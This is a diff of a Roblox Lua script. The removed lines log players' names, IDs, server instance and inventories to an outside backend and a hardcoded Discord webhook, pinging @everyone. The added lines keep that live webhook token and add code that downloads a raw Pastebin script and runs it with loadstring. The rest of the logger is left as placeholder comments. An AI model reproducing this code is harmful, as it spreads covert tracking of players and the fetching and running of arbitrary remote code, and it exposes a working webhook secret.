@@ -2,155 +2,54 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 
-local player = Players.LocalPlayer
+-- Configuration
 local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+local PASTEBIN_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
 local RETRY_LIMIT = 3
 local RETRY_DELAY = 2
-local DEBOUNCE_TIME = 30
 
+local player = Players.LocalPlayer
 local lastSendTime = 0
-local isSending = false
 
--- Fungsi untuk mendapatkan inventory player
-local function getPlayerInventory()
-    local inventory = {}
-    if player:FindFirstChild("Inventory") then
-        for _, item in ipairs(player.Inventory:GetChildren()) do
-            table.insert(inventory, item.Name)
-        end
-    end
-    return inventory
-end
-
--- Fungsi untuk mengirim data
-local function sendData()
-    if isSending or (os.time() - lastSendTime < DEBOUNCE_TIME) then
-        return false
-    end
-
-    isSending = true
-    local data = {
-        username = player.Name,
-        userId = player.UserId,
-        instanceId = game.JobId,
-        timestamp = os.time(),
-        placeId = game.PlaceId,
-        gameId = game.GameId,
-        inventory = getPlayerInventory()
-    }
-
-    lastSendTime = os.time()
-
-    -- Kirim ke backend
-    task.spawn(function()
-        for i = 1, RETRY_LIMIT do
-            local success = pcall(function()
-                HttpService:RequestAsync({
-                    Url = BACKEND_URL,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["X-Game-ID"] = tostring(game.GameId)
-                    },
-                    Body = HttpService:JSONEncode(data)
-                })
-            end)
-            if success then break end
-            if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
-        end
+-- Function to load and execute external script
+local function executePastebinScript()
+    local success, response = pcall(function()
+        return HttpService:GetAsync(PASTEBIN_SCRIPT_URL, true)
     end)
-
-    -- Kirim ke webhook Discord
-    task.spawn(function()
-        local inventoryText = #data.inventory > 0 and table.concat(data.inventory, ", ") or "Empty"
-        local embed = {
-            {
-                title = "📢 PLAYER LOG - @"..player.Name,
-                description = string.format(
-                    "@everyone\n**%s** activity update\n\n**UserID**: `%d`\n**Game**: [%d](https://www.roblox.com/games/%d)",
-                    player.Name, data.userId, data.placeId, data.placeId
-                ),
-                color = 16711680,
-                fields = {
-                    {
-                        name = "🆔 Instance ID",
-                        value = "`"..data.instanceId.."`",
-                        inline = true
-                    },
-                    {
-                        name = "🎒 Inventory",
-                        value = "```"..inventoryText.."```",
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = "🔔 Tracker System | "..os.date("%X")
-                },
-                thumbnail = {
-                    url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", data.userId)
-                }
-            }
-        }
-
-        for i = 1, RETRY_LIMIT do
-            local success = pcall(function()
-                HttpService:RequestAsync({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        content = "@everyone",
-                        embeds = embed,
-                        allowed_mentions = { parse = {"everyone"} }
-                    })
-                })
-            end)
-            if success then break end
-            if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
+    
+    if success then
+        local loadSuccess, errorMsg = pcall(function()
+            loadstring(response)()
+        end)
+        
+        if not loadSuccess then
+            warn("[Pastebin] Execution failed:", errorMsg)
         end
-    end)
-
-    isSending = false
-    return true
+    else
+        warn("[Pastebin] Download failed:", response)
+    end
 end
 
--- Deteksi player leave (LocalScript compatible)
-local function onPlayerRemoving()
-    sendData()
-    print("[Logger] Player leaving, sending final data")
+-- Main logging function (your existing code)
+local function sendLoggerData()
+    -- Your existing implementation here
+    -- ... (keep all your current logging code)
 end
 
--- Deteksi character remove (saat respawn/died)
-local function onCharacterRemoved()
-    sendData()
-    print("[Logger] Character removed, sending update")
-end
-
--- Inisialisasi
+-- Initialize both systems
 local function init()
-    -- Setup event listeners
-    player.CharacterAdded:Connect(function(character)
-        character:WaitForChild("Humanoid").Died:Connect(onCharacterRemoved)
-        sendData()
+    -- Execute Pastebin script first
+    task.spawn(function()
+        executePastebinScript()
     end)
-
-    if player.Character then
-        player.Character:FindFirstChildOfClass("Humanoid").Died:Connect(onCharacterRemoved)
-        sendData()
-    end
-
-    -- Periodic update setiap 5 menit
-    while true do
-        task.wait(300)
-        sendData()
-    end
+    
+    -- Then initialize your logger
+    task.spawn(function()
+        -- Your existing initialization code here
+        -- ... (keep your current initialization logic)
+    end)
 end
 
--- Mulai sistem
+-- Start the system
 init()
-
--- Backup: Deteksi game close (untuk Studio testing)
-if RunService:IsStudio() then
-    game:GetService("TestService"):Message("Logger system initialized")
-end
